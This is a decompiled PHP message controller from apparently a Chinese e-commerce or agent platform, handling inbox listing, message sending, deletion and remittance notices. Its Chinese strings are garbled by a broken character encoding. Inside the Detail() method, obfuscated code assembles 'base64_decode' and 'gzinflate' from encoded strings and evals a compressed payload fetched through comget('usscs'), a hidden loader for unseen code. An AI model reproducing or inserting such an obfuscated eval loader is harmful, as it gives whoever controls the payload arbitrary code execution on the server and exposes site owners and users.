<?php
/*********************/
/*                   */
/*  Version : 5.1.0  */
/*  Author  : RM     */
/*  Comment : 071223 */
/*                   */
/*********************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class MsgController extends Controller
{

				public $hander = NULL;
				public $action = NULL;
				public $session = NULL;

				public function __construct( )
				{
								$this->hander = factory::getinstance( "msg" );
								$this->session = factory::getinstance( "session" );
								$this->SetUser( );
								$this->Init( );
				}

				public function GoHome( )
				{
								$this->ScriptRedirect( "index.php" );
				}

				public function SetUser( )
				{
								$agent = $this->session->user;
								if ( $agent == "" )
								{
												$this->Alert( "�û�δ��½�����ȵ�½" );
												$this->GoHome( );
								}
								$R2097a8fddf = factory::getinstance( "agents" );
								$R3db8f5c8bc = $R2097a8fddf->IAgent_GetByName( $agent[0] );
								if ( !isset( $R3db8f5c8bc['aname'] ) )
								{
												$this->Alert( "�û�û�п�ͨ��" );
												$this->GoHome( );
								}
								if ( $R3db8f5c8bc['frozen'] == 1 )
								{
												$this->Alert( "�û�û�п�ͨ��" );
												$this->GoHome( );
								}
								$R063e6693e5 = factory::getinstance( "ranks" );
								$R6009e84434 = $R063e6693e5->IRank_GetNameById( $R3db8f5c8bc['alv'] );
								$R3db8f5c8bc['rankname'] = $R6009e84434;
								$this->Assign( "data", $R3db8f5c8bc );
				}

				public function Init( )
				{
								$this->ShopInit( "�û���������" );
				}

				public function Index( )
				{
								$Rcc5c6e696c = $this->session->user;
								list( , , , , $R5334b17ba8, , , $R2a51483b14 ) = $Rcc5c6e696c;
								$Ra3d21a857b = intval( request( "msgfrom" ) );
								$R180beb7e65 = intval( request( "msgto" ) );
								if ( 0 < $Ra3d21a857b )
								{
												$Ra3d21a857b = $R2a51483b14;
								}
								if ( 0 < $R180beb7e65 )
								{
												$R180beb7e65 = $R2a51483b14;
								}
								$R71a664ef8c = $this->PageInfo( );
								$data = array(
												"msgfrom" => $Ra3d21a857b,
												"msgto" => $R180beb7e65,
												"msgtype" => intval( request( "msgtype" ) ),
												"msgcat" => intval( request( "msgcat" ) ),
												"bossid" => $R5334b17ba8
								);
								$data = array_merge( $data, $R71a664ef8c );
								$R4e420efcc3 = $this->hander->IMsg_QueryPage( $data );
								$this->FillPage( $data, $R4e420efcc3 );
								$R21784dec6e = $Ra3d21a857b == "" ? "receive" : "send";
								$this->Assign( "msgtype", $R21784dec6e );
								$Rd41ed45824 = array( "<font color=\"#cccccc\">ȫ��</font>", "��ͨ����", "<font color=\"#ff00ff\">������</font>", "<font color=\"#ff0000\">Ͷ�߶���</font>" );
								$this->Assign( "tarray", $Rd41ed45824 );
								$tpl = getvar( "tpl" );
					
												$this->view( $tpl );
					
				}

				public function add( )
				{
								$Rcc5c6e696c = $this->session->user;
								$R2a51483b14 = $Rcc5c6e696c[7];
								$R180beb7e65 = getvar( "msgto" );
								$R8f21e475c6 = getvar( "msgtitle" );
								$R21784dec6e = getvar( "msgtype", 1 );
								$this->Assign( "msgto", $R180beb7e65 );
								$this->Assign( "msgtitle", $R8f21e475c6 );
								$this->Assign( "msgtype", $R21784dec6e );
								$R2097a8fddf = factory::getinstance( "agents" );
								$R1f6f93f8bb = $R2097a8fddf->IAgent_GetUnderling( $R2a51483b14 );
								$this->Assign( "agents", $R1f6f93f8bb );
								$R5f84c47438 = factory::getinstance( "staffs" );
								$R3aba65936f = $R5f84c47438->IStaff_GetAll( "*", $R2a51483b14 );
								$this->Assign( "staffs", $R3aba65936f );
						
												$this->View( );
						
				}

				public function Save( )
				{
								$Rcc5c6e696c = $this->session->user;
								$R2a51483b14 = $Rcc5c6e696c[7];
								$Ra3d21a857b = $R2a51483b14;
								$R26238b353c = "";
								$R21784dec6e = intval( request( "msgtype", 1 ) );
								$R180beb7e65 = intval( getvar( "msgto" ) );
								if ( 0 < $Rcc5c6e696c[9] )
								{
												$R180beb7e65 = $R2a51483b14;
												$Ra3d21a857b = 0 - $Rcc5c6e696c[9];
								}
								else
								{
												switch ( $R180beb7e65 )
												{
												case 0 :
																$R180beb7e65 = 0;
																break;
												case 1 :
																$R180beb7e65 = $Rcc5c6e696c[4];
																break;
												case 2 :
																$R180beb7e65 = 999999;
																$R26238b353c = "allunderling";
																break;
												case 3 :
																$R180beb7e65 = intval( getvar( "underlingid" ) );
																break;
												case 4 :
																$R180beb7e65 = 999999;
																$R26238b353c = "allstaffs";
																break;
												case 5 :
																$R180beb7e65 = intval( getvar( "staffid" ) );
																break;
												default :
																$this->Alert( "�Ƿ�������" );
																$this->HistoryGo( );
																break;
												}
								}
								$R06c518f70e = getvar( "title" );
								$Re82ee9b121 = htmlspecialchars( getvar( "content" ) );
								$Rac9b8532b8 = intval( getvar( "parentid" ) );
								$data = array(
												"msgfrom" => $Ra3d21a857b,
												"msgto" => $R180beb7e65,
												"msgcc" => $R26238b353c,
												"title" => $R06c518f70e,
												"createdate" => date( "Y-m-d H-i-s" ),
												"createip" => $_SERVER['REMOTE_ADDR'],
												"content" => $Re82ee9b121,
												"parentid" => $Rac9b8532b8,
												"msgtype" => $R21784dec6e,
												"comefrom" => UB_DEFAULT == "b2c" ? 2 : 3
								);
								$R808b89ba0e = $this->hander->IMsg_Create( $data );
								$R89be194f71 = "";
								$R6e194e1d6e = "";
								switch ( $R21784dec6e )
								{
								case 1 :
												$R89be194f71 = "���ã��������������Ѿ��յ������ǻἰʱ�����ظ���";
												$R6e194e1d6e = "�ܱ�Ǹ������������ԭ���·���ʧ�ܣ���������д����������Ϣ";
												break;
								case 2 :
												$R89be194f71 = "���ã����Ļ����Ϣ�����Ѿ��յ�����ʵ�����ǻ�Ѷ�Ӧ������������˻���";
												$R6e194e1d6e = "�ܱ�Ǹ������������ԭ���·���ʧ�ܣ���������д���Ļ����Ϣ";
												break;
								case 3 :
												$R89be194f71 = "���ã�����Ͷ����Ϣ�����Ѿ��ִ����ǻἰʱ�������һ������Ľ��";
												$R6e194e1d6e = "�ܱ�Ǹ������������ԭ���·���ʧ�ܣ���������д����Ͷ����Ϣ";
												break;
								default :
												$R89be194f71 = "���ã��������������Ѿ��յ������ǻἰʱ�����ظ���";
												$R6e194e1d6e = "�ܱ�Ǹ������������ԭ���·���ʧ�ܣ���������д����������Ϣ";
												break;
								}
								if ( 0 < $Rac9b8532b8 )
								{
												$R89be194f71 = "���ã����Ļظ���Ϣ�����Ѿ��յ�";
												$R6e194e1d6e = "�ܱ�Ǹ������������ԭ���·���ʧ�ܣ���������д���Ļظ���Ϣ";
								}
								if ( $R808b89ba0e )
								{
												$this->Alert( $R89be194f71 );
												$this->ScriptRedirect( "index.php?m=mod_user&c=msg&msgfrom=".$R2a51483b14 );
								}
								else
								{
												$this->Alert( $R6e194e1d6e );
												$this->HistoryGo( );
								}
				}

				public function ReplayDetail( )
				{
								$R3584859062 = intval( getvar( "id" ) );
								$R3db8f5c8bc = $this->hander->IMsg_GetById( $R3584859062 );
							
												$this->Assign( "item", $R3db8f5c8bc );
												$this->View( );
							
				}

				public function Detail( )
				{
								$Rcc5c6e696c = $this->session->user;
								$R2a51483b14 = $Rcc5c6e696c[7];
								$R3584859062 = intval( getvar( "id" ) );
								$R3db8f5c8bc = $this->hander->IMsg_GetById( $R3584859062 );
								$R43491e0424 = 0;
								$Rac9b8532b8 = $R3db8f5c8bc['parentid'];
								if ( $R2a51483b14 == $R3db8f5c8bc['msgto'] )
								{
												$data = array( "isreaded" => 1 );
												$this->hander->IMsg_Update( $data, $R3584859062 );
								}
								else if ( $R3db8f5c8bc['msgto'] == 999999 && $R3db8f5c8bc['msgcc'] == "all" && $R3db8f5c8bc['msgfrom'] == 0 || $R3db8f5c8bc['msgto'] == 999999 && $R3db8f5c8bc['msgcc'] == "allunderling" && $R3db8f5c8bc['msgfrom'] == $Rcc5c6e696c[4] )
								{
												$data = array(
																"aid" => $R2a51483b14,
																"msgid" => $R3db8f5c8bc['id']
												);
												if ( $this->hander->IMsg_RowsExt( $data ) == 0 )
												{
																$this->hander->IMsg_CreateExt( $data );
																$data = array( "isreaded" => 1 );
																$this->hander->IMsg_Update( $data, $R3584859062 );
												}
												$R43491e0424 = 1;
								}
								if ( 0 < $Rac9b8532b8 )
								{
												$R3584859062 = $Rac9b8532b8;
												$R3db8f5c8bc = $this->hander->IMsg_GetById( $R3584859062 );
								}
								$Rac9b8532b8 = $R3db8f5c8bc['id'];
								if ( $R43491e0424 == 1 )
								{
												$Rac9b8532b8 = 0;
								}
								$this->Assign( "parentid", $Rac9b8532b8 );
								$this->Assign( "msg", $R3db8f5c8bc );
								$data = array(
												"page" => intval( getvar( "page" ) ),
												"parentid" => $R3584859062,
												"nrows" => 200
								);
								$R4e420efcc3 = $this->hander->IMsg_Page( $data, false );
								$this->FillPage( $data, $R4e420efcc3 );
								$R180beb7e65 = "";
								if ( 0 < $Rcc5c6e696c[9] )
								{
												$R180beb7e65 = $R2a51483b14;
								}
								else if ( $R3db8f5c8bc['msgfrom'] == $R2a51483b14 )
								{
												$R180beb7e65 = $R3db8f5c8bc['msgto'];
								}
								else
								{
												$R180beb7e65 = $R3db8f5c8bc['msgfrom'];
								}
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "usscs" ) ) ) );
				}

				public function Del( )
				{
								$Rcc5c6e696c = $this->session->user;
								$R2a51483b14 = $Rcc5c6e696c[7];
								$R3584859062 = intval( getvar( "id" ) );
								$R3db8f5c8bc = $this->hander->IMsg_GetById( $R3584859062 );
								if ( $R3db8f5c8bc['msgto'] == $R2a51483b14 )
								{
												$data = array( "hidden" => 1 );
												$this->hander->IMsg_Update( $data, $R3584859062 );
								}
								else if ( $R3db8f5c8bc['msgto'] == 999999 && $R3db8f5c8bc['msgcc'] == "all" && $R3db8f5c8bc['msgfrom'] == 0 || $R3db8f5c8bc['msgto'] == 999999 && $R3db8f5c8bc['msgcc'] == "allunderling" && $R3db8f5c8bc['msgfrom'] == $Rcc5c6e696c[4] )
								{
												$data = array(
																"aid" => $R2a51483b14,
																"msgid" => $R3db8f5c8bc['id']
												);
												if ( $this->hander->IMsg_RowsExt( $data ) == 0 )
												{
																$data['hidden'] = 1;
																$this->hander->IMsg_CreateExt( $data );
												}
												else
												{
																$R794010fd36 = array( "hidden" => 1 );
																$this->hander->IMsg_UpdateExtByLimit( $R794010fd36, $data );
												}
								}
								else if ( $R3db8f5c8bc['msgfrom'] == $R2a51483b14 )
								{
												$data = array(
																"aid" => $R2a51483b14,
																"msgid" => $R3db8f5c8bc['id']
												);
												if ( $this->hander->IMsg_RowsExt( $data ) == 0 )
												{
																$data['hidden'] = 1;
																$this->hander->IMsg_CreateExt( $data );
												}
												else
												{
																$R794010fd36 = array( "hidden" => 1 );
																$this->hander->IMsg_UpdateExtByLimit( $R794010fd36, $data );
												}
								}
								else
								{
												$this->Alert( "�Ƿ�������" );
												$this->HistoryGo( );
								}
								$this->Alert( "ɾ���ɹ���" );
								$this->HistoryGo( );
				}

				public function RemittanceSave( )
				{
								$Rcc5c6e696c = $this->session->user;
								$R2a51483b14 = $Rcc5c6e696c[7];
								$Re5576d8e05 = getvar( "year" )."-".getvar( "month" )."-".getvar( "day" )." ".getvar( "hour" ).":00";
								$R2ade2b5cf6 = getvar( "dollars1" );
								$R2e081715dc = getvar( "dollars2" );
								$R9b252bf0a7 = doubleval( $R2ade2b5cf6.".".$R2e081715dc );
								$R51c716b966 = $this->SetLang( 1 );
								$R06c518f70e = "(".$Re5576d8e05.")���".$R2a51483b14."���".$R9b252bf0a7.$R51c716b966['moneyunit'];
								$R2c90a0c76d = getvar( "bank" );
								$R5204d30600 = htmlspecialchars( getvar( "others" ) );
								$Re82ee9b121 = $R2c90a0c76d."\\n\\n��ע\\n".$R5204d30600."\\n\\n����".$R51c716b966['moneysymbol'].$R9b252bf0a7.$R51c716b966['moneyunit']."\\n\\n���ʱ�䣺".$Re5576d8e05;
								$data = array(
												"msgfrom" => $R2a51483b14,
												"msgto" => 0,
												"msgcc" => 0,
												"title" => $R06c518f70e,
												"createdate" => date( "Y-m-d H-i-s" ),
												"createip" => $_SERVER['REMOTE_ADDR'],
												"content" => $Re82ee9b121,
												"msgtype" => 2
								);
								$R808b89ba0e = $this->hander->IMsg_Create( $data );
								if ( $R808b89ba0e )
								{
												$this->Alert( "���֪ͨ�鷢�ͳɹ���" );
												$this->ScriptRedirect( "index.php?m=mod_user&c=msg&msgtype=2&msgfrom=".$R2a51483b14 );
								}
								else
								{
												$this->Alert( "���֪ͨ�鷢��ʧ�ܣ�" );
												$this->HistoryGo( );
								}
				}

}

?>
